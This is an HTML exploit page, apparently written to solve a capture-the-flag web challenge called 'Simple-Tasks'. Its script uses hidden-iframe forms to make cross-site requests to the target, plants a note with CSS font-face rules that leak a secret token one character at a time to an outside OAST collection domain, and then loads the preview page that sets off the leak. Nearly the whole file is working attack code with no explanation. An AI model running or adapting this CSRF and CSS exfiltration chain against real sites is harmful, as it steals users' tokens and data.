<!DOCTYPE html>
<meta charset="utf-8">
<title>Simple-Tasks helper</title>
<iframe name="bg" style="display:none"></iframe>

<script>
/* ======== CHANGE THESE TWO LINES ======== */
const CHAL  = "http://localhost:80";      // challenge origin
const OAST  = "https://xng98z0ayh4xm2rgego9xm8k01jdbfi72.oast.site";  // your Caido sub-domain
/* ========================================= */

/* 1️⃣  create list 0 so token note shifts to 1/0 */
const f1 = document.createElement("form");
f1.method = "POST"; f1.target = "bg";
f1.action = CHAL + "/tasks/create";
document.body.appendChild(f1); f1.submit();

/* 2️⃣  upload the CSS-exfil note into 0/0 */
const hex = "0123456789abcdef";
let css = "";
for (const c of hex) {
  css += `@font-face{font-family:x${c};src:url(${OAST}/leak?d=${c});
           unicode-range:U+${c.charCodeAt(0).toString(16)}}`;
}
const note = `<style>${css}</style><div style="font-family:${[...hex].map(c=>"x"+c).join(",")}">justToken{PLACEHOLDER}</div>`;

const f2 = document.createElement("form");
f2.method = "POST"; f2.target = "bg";
f2.action = CHAL + "/tasks/0";
f2.innerHTML = `<input name="content" value="${note.replace(/"/g,"&quot;")}">`;
setTimeout(()=>{document.body.appendChild(f2);f2.submit();}, 400);

/* 3️⃣  finally view the token note */
setTimeout(()=>location.href = CHAL + "/tasks/preview/1/0", 800);
</script>

